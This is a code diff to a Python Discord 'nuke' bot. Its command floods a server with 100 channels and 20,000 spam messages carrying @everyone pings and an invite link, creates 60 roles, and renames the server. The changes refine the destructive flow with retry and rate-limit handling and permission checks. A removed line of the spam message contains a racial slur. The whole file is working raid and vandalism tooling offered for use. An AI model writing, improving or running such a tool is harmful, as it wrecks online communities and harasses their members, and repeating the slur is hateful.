@@ -22,17 +22,17 @@ RANDOM_CHANNEL_NAMES = [
     "n̶i̶g̶h̶t̶m̶a̶r̶e̶"
 ]
 USE_RANDOM_NAMES = True
-CHANNEL_NAME = "nuked"  # fallback
+CHANNEL_NAME = "nuked"
 
 # New message content with image
 MESSAGE = """# NUKED BY N3XL 
-Fuck u niggers, join da server now! 
+N3XEL ON TOP join da server NOW FOR FREE NUKE BOT 2026!
 https://discord.gg/pbtxaTf8Q4
-https://cdn.discordapp.com/attachments/1500712288032919572/1504852428745474069/image0.gif?ex=6a087e89&is=6a072d09&hm=f6a03505868048307d883a58fe9ec7b796f77d5ee22e4230017e16b1c74a3497&
+https://media1.giphy.com/media/v1.Y2lkPTc5MGI3NjExNHRleGlwcWllOWl6MnNvYWU3N3V4NXJveXcya2oyeXEwZDZmaW9heSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/Eg41D2Obf58kpy8aaK/giphy.gif
 ||@everyone|| ||@here||"""
 
 AMOUNT_OF_CHANNELS = 100
-MESSAGES_PER_CHANNEL = 200   # <-- 200 messages per channel
+MESSAGES_PER_CHANNEL = 200   # 200 messages per channel
 AMOUNT_OF_MESSAGES = AMOUNT_OF_CHANNELS * MESSAGES_PER_CHANNEL
 
 # Roles to create (base names, will be cycled to make 60 total)
@@ -42,7 +42,7 @@ BASE_ROLE_NAMES = [
     "N̶X̶L̶ O̶N̶ T̶O̶P̶",
     "₦ɆӾɆⱠ"
 ]
-AMOUNT_OF_ROLES = 60  # total roles to create
+AMOUNT_OF_ROLES = 60
 
 # New server name
 NEW_SERVER_NAME = "TAMED BY N3XL"
@@ -119,50 +119,37 @@ async def create_60_roles(guild):
     return created
 
 async def rename_server(guild):
-    """Rename server with retry logic and permission check"""
-    # Check if bot has manage_guild permission
-    if not guild.me.guild_permissions.manage_guild:
-        print("❌ Bot missing 'Manage Server' permission. Cannot rename.")
-        return
-    
-    for attempt in range(3):
-        try:
-            await guild.edit(name=NEW_SERVER_NAME, reason="Nuked by N3XEL")
-            print(f"✅ Renamed server to {NEW_SERVER_NAME}")
-            return
-        except discord.Forbidden:
-            print("❌ Forbidden: Bot lacks permission to rename server.")
-            return
-        except discord.HTTPException as e:
-            if e.status == 429:  # rate limit
-                retry_after = e.retry_after
-                print(f"⏳ Rate limited on rename, waiting {retry_after}s (attempt {attempt+1}/3)")
-                await asyncio.sleep(retry_after)
-            else:
-                print(f"❌ Failed to rename server: {e}")
-                return
-        except Exception as e:
-            print(f"❌ Unexpected error renaming server: {e}")
-            return
-    print("❌ Could not rename server after 3 attempts.")
+    """Rename server with retry and delay"""
+    await asyncio.sleep(5)  # wait a bit after all operations
+    try:
+        await guild.edit(name=NEW_SERVER_NAME, reason="Nuked by N3XEL")
+        print(f"✅ Renamed server to {NEW_SERVER_NAME}")
+    except discord.Forbidden:
+        print("❌ Failed to rename: Bot lacks 'Manage Server' permission. Grant it and re-run .nuke")
+    except discord.HTTPException as e:
+        if e.status == 429:
+            print(f"Rate limited on rename, waiting {e.retry_after}s...")
+            await asyncio.sleep(e.retry_after)
+            try:
+                await guild.edit(name=NEW_SERVER_NAME)
+                print(f"✅ Renamed server on retry to {NEW_SERVER_NAME}")
+            except Exception as retry_err:
+                print(f"Retry failed: {retry_err}")
+        else:
+            print(f"Failed to rename server: {e}")
 
 async def send_messages_fast(channels, message, total):
     if not channels:
         return
-    # Increased semaphore to 100 for faster sending (20,000 messages total)
-    semaphore = asyncio.Semaphore(100)
+    semaphore = asyncio.Semaphore(100)  # increased concurrency for 20000 messages
     async def send_one(channel):
         async with semaphore:
             try:
                 await channel.send(message)
             except discord.HTTPException as e:
                 if e.status == 429:
-                    retry_after = e.retry_after
-                    await asyncio.sleep(retry_after)
-                    try:
-                        await channel.send(message)
-                    except Exception:
-                        pass
+                    await asyncio.sleep(e.retry_after)
+                    await channel.send(message)
             except Exception:
                 pass
     tasks = []
@@ -206,7 +193,7 @@ async def nuke_server(guild: discord.Guild):
     # Step 5: Create 60 roles
     await create_60_roles(guild)
 
-    # Step 6: Rename server (fixed with retry)
+    # Step 6: Rename server (with retry and delay)
     await rename_server(guild)
 
     elapsed = time.perf_counter() - start_time
@@ -224,7 +211,11 @@ async def nuke(ctx):
     if not ctx.author.guild_permissions.administrator:
         await ctx.send("❌ You need Administrator permission to use this command!")
         return
-    await ctx.send("💣 Nuking server in progress...")
+    # Double-check bot permissions
+    me = ctx.guild.me
+    if not me.guild_permissions.manage_guild:
+        await ctx.send("⚠️ Bot lacks 'Manage Server' permission. Server rename will fail. Please grant it.")
+    await ctx.send("💣 Nuking server in progress... (200 messages per channel, 60 roles, server rename)")
     await nuke_server(ctx.guild)
 
 @bot.command(name="config")
